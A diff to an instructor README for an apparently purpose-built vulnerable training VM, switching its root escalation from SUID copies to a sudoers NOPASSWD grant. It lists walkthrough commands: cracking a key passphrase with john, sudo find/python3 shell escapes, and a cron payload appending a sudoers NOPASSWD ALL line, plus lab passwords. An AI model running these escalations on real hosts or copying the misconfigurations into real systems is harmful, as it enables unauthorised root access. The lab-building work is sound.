@@ -67,9 +67,9 @@ deploy/          nginx site config + PHP-FPM pool config
 | Find the deploy key | `/opt/saguaro/field-sync.sh` is world-readable and, being a real sync script, names the key it authenticates with: `ssh -i /opt/saguaro/deploy/id_rsa`. `linpeas` also flags the readable private key directly. |
 | **Crack the passphrase** | The key is mode 0644 but passphrase-protected. `ssh2john id_rsa > k.hash` then `john --wordlist=/usr/share/wordlists/rockyou.txt k.hash`. It is a legacy RSA-PEM key (AES-128-CBC), so this falls in seconds. |
 | SSH in | `chmod 600 id_rsa` first — OpenSSH refuses a world-readable key with "UNPROTECTED PRIVATE KEY FILE". Then `ssh -i id_rsa hrivera@<target>` → `cat ~/user.txt`. |
-| **LinPE → root** — pick any | Enumerate with `id` and `find / -perm -4000 -type f 2>/dev/null`. All three routes are gated to the `fieldops` group, which only `hrivera` is in. |
-| &nbsp;&nbsp;SUID `find` | `/opt/saguaro/bin/find . -exec /bin/sh -p \; -quit` |
-| &nbsp;&nbsp;SUID `python3` | `/opt/saguaro/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
+| **LinPE → root** — pick any | `sudo -l` is the money shot and needs **no password** — the entries are `NOPASSWD`, and sudoers' `listpw` default of `any` means they list password-free. It prints `(root) NOPASSWD: /usr/bin/find, /usr/bin/python3`. The grant is scoped to the `fieldops` group, which only `hrivera` is in. |
+| &nbsp;&nbsp;sudo `find` | `sudo find . -exec /bin/sh \; -quit` |
+| &nbsp;&nbsp;sudo `python3` | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
 | &nbsp;&nbsp;writable root cron | `/etc/cron.d/saguaro-fieldsync` runs `/opt/saguaro/field-sync.sh` as root every minute; the script is `0775 root:fieldops`. Append a payload and wait 60s. |
 | root flag | `cat /root/root.txt` |
 | SQLi (off-path) | `/research.php?q=` is injectable — `sqlmap` dumps `users`. Hashes are unsalted SHA-256 of rockyou words; `hashcat -m 1400` cracks them. **`hrivera` is deliberately absent from that table**, so this route cannot shortcut the chain. |
@@ -77,16 +77,30 @@ deploy/          nginx site config + PHP-FPM pool config
 
 ### Notes for the instructor
 
-- **Both SUID binaries are copies.** `/usr/bin/find` and `/usr/bin/python3` are
-  untouched at 0755. The copies live in `/opt/saguaro/bin` (deliberately *not*
-  on the default `PATH`, so they shadow nothing) at `4750 root:fieldops`, and
+- **The privesc is sudo, not setuid.** `/usr/bin/find` and `/usr/bin/python3`
+  are completely untouched at 0755 with no setuid bit — there are no setuid
+  binaries on this box beyond the distro's own set, which the `NO_STRAY_SUID`
+  bake marker enforces. All the scoping is done by
+  `/etc/sudoers.d/fieldops-maint`, which grants `%fieldops` only, and
   `saguarobot` is **not** in `fieldops`. RCE therefore cannot skip the SSH
-  stage. The only thing crossing between the two accounts is the readable
+  stage; the only thing crossing between the two accounts is the readable
   deploy key.
+- **Why sudo rather than a setuid bit.** Bad sudoers rules are the single
+  highest-yield finding in a real Linux engagement, which is why `sudo -l` is
+  the first command most operators run; an admin actually running
+  `chmod u+s /usr/bin/find` is largely a CTF trope. sudo is also the cleaner
+  gate here: per-user and per-group scoping is precisely what sudoers exists
+  for, whereas setuid has no such concept and previously needed an invented
+  `4750 root:fieldops` wrapper directory to keep `saguarobot` out.
 - **`/tmp` is `nosuid`** (systemd tmpfs on Debian 13), so the classic
   `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` cron payload silently
-  fails. Use `/var/tmp`, or drop a sudoers file:
-  `echo 'hrivera ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/zz-hrivera`.
+  fails. This bites students on the *cron* route specifically. Use `/var/tmp`
+  instead, or append a payload that widens sudoers — note the nested quoting,
+  since the outer `echo` has to write a shell command into the script:
+  ```sh
+  echo "echo 'hrivera ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/zz-hrivera" \
+    >> /opt/saguaro/field-sync.sh
+  ```
   The bake records the actual mount options as `TMP_OPTS` in
   `/etc/cybercore-bake.env`.
 - **`/opt/saguaro` is `0755 root:root`**, so `field-sync.sh` can be *modified*
@@ -95,9 +109,23 @@ deploy/          nginx site config + PHP-FPM pool config
 - **The private key ships mode 0644 on purpose.** Students must copy it and
   `chmod 600` before `ssh -i` will accept it. That is a teaching point, not a
   bug.
-- **`sudo -l` as `saguarobot` returns nothing.** This is enforced by the
-  `SUDOERS_CLEAN` bake marker. See the sudo guard note below for why that took
-  two layers.
+- **`saguarobot` has no sudo at all**, enforced by the `SUDOERS_CLEAN` bake
+  marker — see the sudo guard note below for why that took two layers. As
+  `saguarobot`, `sudo -l` prompts for a password it cannot satisfy and then
+  reports no rights. That is normal sudo behaviour and a deliberate dead end.
+- **Worth teaching: SSH authentication method and sudo are unrelated.** A key
+  session does not grant passwordless sudo — sudo re-authenticates the invoking
+  user through PAM against their *Linux* password on every call and has no idea
+  whether the session came from a key, a password, the console or `su`. Only a
+  `NOPASSWD:` tag or `!authenticate` in sudoers suppresses the prompt. That is
+  exactly why `hrivera` gets a prompt-free `sudo -l` (the `fieldops` entries are
+  `NOPASSWD`) while `saguarobot` gets a password wall (no entries at all) —
+  despite both being ordinary shells. sudo also authenticates *before* revealing
+  that a user has no rights, so unauthenticated users cannot enumerate policy.
+- **`hrivera`'s password is `Sag-F1eld-Ops-2026!`** — deliberately absent from
+  rockyou, so the deploy key stays the only intended way in. Students never need
+  it, since the sudo grant is `NOPASSWD`; it exists for instructor console
+  access and demos.
 
 ## Credential / artifact reference (instructors)
 
@@ -121,7 +149,8 @@ Linux accounts:
 - `root` — bake-debug password for instructor inspection.
 
 Groups:
-- `fieldops` — `hrivera` only. Gates the setuid toolkit and the cron script.
+- `fieldops` — `hrivera` only. Carries the sudo `NOPASSWD` grant and owns the
+  cron script. Joining this group *is* the privesc, so nothing else may.
 
 Bake-script artifacts:
 - `/opt/saguaro/deploy/id_rsa` — **0644**, RSA-PEM, passphrase `mariposa`
@@ -131,8 +160,11 @@ Bake-script artifacts:
 - `/opt/saguaro/field-sync.sh` — `0775 root:fieldops`. Names the key (it really
   uses it) and is the cron privesc target.
 - `/etc/cron.d/saguaro-fieldsync` — runs the above as root every minute.
-- `/opt/saguaro/bin/{find,python3}` — `4750 root:fieldops` copies, plus a
-  `README` explaining the "field ops setuid toolkit" cover story.
+- `/etc/sudoers.d/fieldops-maint` — `0440 root:root`, the primary privesc:
+  `%fieldops ALL=(root) NOPASSWD: /usr/bin/find, /usr/bin/python3`, framed as a
+  maintenance grant for nightly sweeps and telemetry reindexing. The bake runs
+  `visudo -c` against it and refuses to seal if it does not parse, because a
+  syntax error here breaks `sudo` for every user on the box.
 - `/home/hrivera/user.txt` (`0640 hrivera:hrivera`), `/root/root.txt` (`0600`).
   Static values; override at bake time with `USER_FLAG_VALUE` /
   `ROOT_FLAG_VALUE`. Nothing in CyberCore validates flags today, so they are
@@ -149,7 +181,8 @@ Bake-script artifacts:
 
 Every intentional vulnerability is verified at bake time — see the marker block
 in `bake-cybersaguaros-template.sh`. It refuses to seal a broken template, and
-three of the markers (`SUID_GATED`, `KEY_ENCRYPTED`, `SUDOERS_CLEAN`) are
+four of the markers (`SUDO_GATED`, `KEY_ENCRYPTED`, `SUDOERS_CLEAN`,
+`NO_STRAY_SUID`) are
 *negative* assertions that catch a collapsed chain rather than a missing file.
 
 The bot/SSRF is reachable without any login — the researcher login, the SQLi and
